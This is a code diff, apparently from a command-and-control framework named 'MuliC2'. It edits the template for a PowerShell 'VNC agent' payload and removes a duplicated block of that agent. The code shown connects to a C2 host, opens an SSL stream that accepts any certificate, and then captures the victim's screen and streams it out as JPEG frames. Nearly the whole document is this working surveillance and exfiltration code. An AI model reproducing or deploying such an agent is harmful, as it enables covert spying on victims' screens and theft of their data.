@@ -1033,7 +1033,7 @@ try {
 }
 
 try {
-    Write-Host "[*] Connecting to MuliC2 server at \$C2Host`:\$C2Port..." -ForegroundColor Cyan
+    Write-Host "[*] Connecting to MuliC2 server at \$C2Host\`:\$C2Port..." -ForegroundColor Cyan
     
     # Create TCP client with connection timeout
     \$global:tcpClient = New-Object System.Net.Sockets.TcpClient
@@ -1043,7 +1043,7 @@ try {
     \$connected = \$connectTask.Wait(10000) # 10 second timeout
     
     if (-not \$connected -or -not \$global:tcpClient.Connected) {
-        throw "Connection to \$C2Host`:\$C2Port failed or timed out"
+        throw "Connection to \$C2Host\`:\$C2Port failed or timed out"
     }
     
     Write-Host "[+] TCP connection established" -ForegroundColor Green
@@ -1156,7 +1156,7 @@ try {
     
 } catch {
     Write-Host "[!] Connection error: \$(\$_.Exception.Message)" -ForegroundColor Red
-    Write-Host "[!] Make sure the MuliC2 listener is running on \$C2Host`:\$C2Port" -ForegroundColor Red
+    Write-Host "[!] Make sure the MuliC2 listener is running on \$C2Host\`:\$C2Port" -ForegroundColor Red
 } finally {
     # Final cleanup
     if (-not \$global:cleanupInProgress) {
@@ -1174,172 +1174,6 @@ try {
     } catch {}
     
             Write-Host "[*] MuliC2 VNC agent terminated" -ForegroundColor Yellow
-}`
-
-# Register cleanup for PowerShell exit
-$exitHandler = Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {
-    if (-not $global:cleanupInProgress) {
-        Invoke-GracefulCleanup $false
-    }
-}
-
-# CTRL+C handler
-$cancelHandler = $null
-try {
-    $cancelHandler = {
-        param($sender, $e)
-        $e.Cancel = $true  # Prevent immediate termination
-        Write-Host "`n[*] CTRL+C detected - shutting down gracefully..." -ForegroundColor Yellow
-        Invoke-GracefulCleanup $true
-        [System.Environment]::Exit(0)
-    }
-    [System.Console]::add_CancelKeyPress($cancelHandler)
-} catch {
-    Write-Host "[!] Console handlers not available in this environment" -ForegroundColor Yellow
-}
-
-try {
-    Write-Host "[*] Connecting to MuliC2 server at $C2Host`:$C2Port..." -ForegroundColor Cyan
-    
-    # Create TCP client with connection timeout
-    $global:tcpClient = New-Object System.Net.Sockets.TcpClient
-    
-    # Set connection timeout
-    $connectTask = $global:tcpClient.ConnectAsync($C2Host, $C2Port)
-    $connected = $connectTask.Wait(10000) # 10 second timeout
-    
-    if (-not $connected -or -not $global:tcpClient.Connected) {
-        throw "Connection to $C2Host`:$C2Port failed or timed out"
-    }
-    
-    Write-Host "[+] TCP connection established" -ForegroundColor Green
-    
-    # Configure socket options
-    $socket = $global:tcpClient.Client
-    $socket.ReceiveTimeout = -1  # Infinite
-    $socket.SendTimeout = 30000  # 30 seconds
-    $socket.NoDelay = $true
-    
-    # Create SSL stream with certificate validation bypass
-    $global:sslStream = New-Object System.Net.Security.SslStream(
-        $global:tcpClient.GetStream(), 
-        $false,
-        ([System.Net.Security.RemoteCertificateValidationCallback] {
-            param($sender, $certificate, $chain, $sslPolicyErrors)
-            return $true
-        })
-    )
-    
-    # Authenticate SSL connection
-    try {
-        $global:sslStream.AuthenticateAsClient($C2Host)
-    } catch {
-        throw "SSL authentication failed: $($_.Exception.Message)"
-    }
-    
-    if (-not $global:sslStream.IsAuthenticated) {
-        throw "SSL authentication failed - stream not authenticated"
-    }
-    
-    Write-Host "[+] SSL connection established and authenticated" -ForegroundColor Green
-    Write-Host "[*] Starting screen capture... (Press CTRL+C to exit gracefully)" -ForegroundColor Cyan
-    Write-Host "[*] Capturing 200x150 resolution at 5 FPS" -ForegroundColor Gray
-    
-    # Main capture loop with comprehensive error handling
-    $frameCount = 0
-    $lastErrorTime = 0
-    
-    while ($global:isRunning -and $global:tcpClient.Connected -and $global:sslStream.CanWrite) {
-        try {
-            $frameCount++
-            
-            # Create bitmap and graphics objects
-            $bitmap = New-Object System.Drawing.Bitmap(200, 150)
-            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-            
-            # Capture screen
-            $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
-            
-            # Convert to JPEG
-            $memoryStream = New-Object System.IO.MemoryStream
-            $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-            $screenBytes = $memoryStream.ToArray()
-            
-            # Properly dispose of graphics objects
-            $graphics.Dispose()
-            $bitmap.Dispose()
-            $memoryStream.Dispose()
-            
-            # Send data if connection is still valid
-            if ($global:sslStream -and $global:sslStream.CanWrite -and $global:isRunning) {
-                # Send length header (4 bytes)
-                $lengthBytes = [BitConverter]::GetBytes($screenBytes.Length)
-                $global:sslStream.Write($lengthBytes, 0, 4)
-                
-                # Send image data
-                $global:sslStream.Write($screenBytes, 0, $screenBytes.Length)
-                $global:sslStream.Flush()
-                
-                # Progress indicator every 25 frames
-                if ($frameCount % 25 -eq 0) {
-                    Write-Host "[*] Frame #$frameCount sent (Size: $($screenBytes.Length) bytes)" -ForegroundColor Gray
-                }
-            } else {
-                Write-Host "[!] SSL stream not writable, connection lost" -ForegroundColor Red
-                break
-            }
-            
-            # Sleep between frames (200ms = ~5 FPS)
-            Start-Sleep -Milliseconds 200
-            
-        } catch [System.ObjectDisposedException] {
-            Write-Host "[!] Object disposed - connection closed" -ForegroundColor Red
-            break
-        } catch [System.IO.IOException] {
-            Write-Host "[!] IO Exception: $($_.Exception.Message)" -ForegroundColor Red
-            break
-        } catch [System.Net.Sockets.SocketException] {
-            Write-Host "[!] Socket Exception: $($_.Exception.Message)" -ForegroundColor Red
-            break
-        } catch [System.InvalidOperationException] {
-            $currentTime = [System.Environment]::TickCount
-            if ($currentTime - $lastErrorTime -gt 5000) { # Log once per 5 seconds
-                Write-Host "[!] Graphics operation failed: $($_.Exception.Message)" -ForegroundColor Red
-                $lastErrorTime = $currentTime
-            }
-            Start-Sleep -Milliseconds 1000
-        } catch {
-            $currentTime = [System.Environment]::TickCount
-            if ($currentTime - $lastErrorTime -gt 5000) { # Log once per 5 seconds
-                Write-Host "[!] Unexpected error: $($_.Exception.Message)" -ForegroundColor Red
-                $lastErrorTime = $currentTime
-            }
-            Start-Sleep -Milliseconds 1000
-        }
-    }
-    
-    Write-Host "[*] Capture loop ended (Total frames: $frameCount)" -ForegroundColor Yellow
-    
-} catch {
-    Write-Host "[!] Connection error: $($_.Exception.Message)" -ForegroundColor Red
-    Write-Host "[!] Make sure the MuliC2 listener is running on $C2Host`:$C2Port" -ForegroundColor Red
-} finally {
-    # Final cleanup
-    if (-not $global:cleanupInProgress) {
-        Invoke-GracefulCleanup $true
-    }
-    
-    # Remove event handlers
-    try {
-        if ($exitHandler) {
-            Unregister-Event -SourceIdentifier "PowerShell.Exiting" -Force -ErrorAction SilentlyContinue
-        }
-        if ($cancelHandler) {
-            [System.Console]::remove_CancelKeyPress($cancelHandler)
-        }
-    } catch {}
-    
-    Write-Host "[*] MuliC2 VNC agent terminated" -ForegroundColor Yellow
 }`
     
     // Apply loader if enabled
